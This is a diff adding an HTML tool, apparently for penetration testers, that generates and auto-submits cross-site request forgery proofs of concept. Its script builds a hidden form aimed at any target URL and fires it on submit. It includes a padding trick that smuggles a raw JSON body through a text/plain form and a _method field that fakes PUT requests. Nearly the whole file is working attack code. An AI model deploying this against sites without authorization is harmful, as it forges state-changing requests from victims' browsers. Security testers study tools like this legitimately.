@@ -1,0 +1,127 @@
+<!-- Author: J0nan -->
+<!-- Version: 1.0.0 -->
+<!-- A simple HTML file that creates PoCs for performing CSRFs -->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF PoC</title>
+    <style>
+        #bodySection,
+        #enctypeWrapper {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <h1>Simple CSRF PoC Generator</h1>
+    <form id="csrfForm">
+        <label for="csrfUrl">Target URL:</label><br>
+        <input id="csrfUrl" name="csrfUrl" style="width: 99%;" required><br><br>
+
+        <label for="csrfMethod">HTTP Method:</label><br>
+        <select id="csrfMethod" name="csrfMethod" style="width: 99%;">
+            <option value="GET">GET</option>
+            <option value="POST">POST</option>
+            <option value="PUT">PUT (It may not work)</option>
+        </select><br><br>
+
+        <div id="enctypeWrapper">
+            <label for="csrfEnctype">Content-Type:</label><br>
+            <select id="csrfEnctype" style="width: 99%;">
+                <option value="application/x-www-form-urlencoded">application/x-www-form-urlencoded</option>
+                <option value="text/plain">text/plain</option>
+                <!-- <option value="application/json">application/json</option> -->
+                <!-- <option value="multipart/form-data">multipart/form-data</option> -->
+                <!-- <option value="application/xml">application/xml</option> -->
+                <!-- <option value="text/xml">text/xml</option> -->
+            </select><br><br>
+        </div>
+
+        <div id="bodySection">
+            <label id="csrfBodyLabel" for="csrfBody">Request body:</label><br>
+            <textarea id="csrfBody" name="csrfBody" rows="5" style="width: 99%;"></textarea><br><br>
+        </div>
+
+        <button type="submit">Generate and Auto-submit PoC</button>
+    </form>
+
+    <script>
+        const methodSelect = document.getElementById('csrfMethod');
+        const bodySection = document.getElementById('bodySection');
+        const enctypeWrapper = document.getElementById('enctypeWrapper');
+        const enctypeSelect = document.getElementById('csrfEnctype');
+        const csrfBodyLabel = document.getElementById('csrfBodyLabel');
+
+        function updateUI() {
+            const method = methodSelect.value;
+            const isBodyMethod = method !== 'GET';
+            const showEnctype = method === 'POST' || method === 'PUT';
+
+            bodySection.style.display = isBodyMethod ? 'block' : 'none';
+            enctypeWrapper.style.display = showEnctype ? 'block' : 'none';
+
+            updateBodyLabel();
+        }
+
+        function updateBodyLabel() {
+            const enctype = enctypeSelect.value;
+            if (enctype === 'application/json' || enctype === 'text/plain') {
+                csrfBodyLabel.textContent = 'Request body (raw JSON):';
+            } else {
+                csrfBodyLabel.textContent = 'Request body (key=value&key2=value2):';
+            }
+        }
+
+        methodSelect.addEventListener('change', updateUI);
+        enctypeSelect.addEventListener('change', updateBodyLabel);
+        window.addEventListener('DOMContentLoaded', updateUI);
+
+        document.getElementById('csrfForm').addEventListener('submit', function (event) {
+            event.preventDefault();
+
+            const url = document.getElementById('csrfUrl').value;
+            const method = methodSelect.value;
+            const body = document.getElementById('csrfBody').value;
+            const enctype = enctypeSelect.value;
+
+            const form = document.createElement('form');
+            form.method = method === 'GET' ? 'GET' : 'POST';
+            form.action = url;
+
+            if (method !== 'GET') {
+                if (method === 'PUT') {
+                    const methodOverride = document.createElement('input');
+                    methodOverride.type = 'hidden';
+                    methodOverride.name = '_method';
+                    methodOverride.value = 'PUT';
+                    form.appendChild(methodOverride);
+                }
+
+                if (enctype === 'application/x-www-form-urlencoded') {
+                    const params = new URLSearchParams(body);
+                    for (const [key, value] of params.entries()) {
+                        const input = document.createElement('input');
+                        input.type = 'hidden';
+                        input.name = key;
+                        input.value = value;
+                        form.enctype = enctype;
+                        form.appendChild(input);
+                    }
+                } else {
+                    const input = document.createElement('input');
+                    form.enctype = enctype;
+                    input.name = body.replace(/}$/, '') + ',"padding":"';
+                    input.value = 'something"}';
+                    input.type = 'hidden';
+                    form.appendChild(input);
+                }
+            }
+
+            document.body.appendChild(form);
+            form.submit();
+        });
+    </script>
+</body>
+</html>
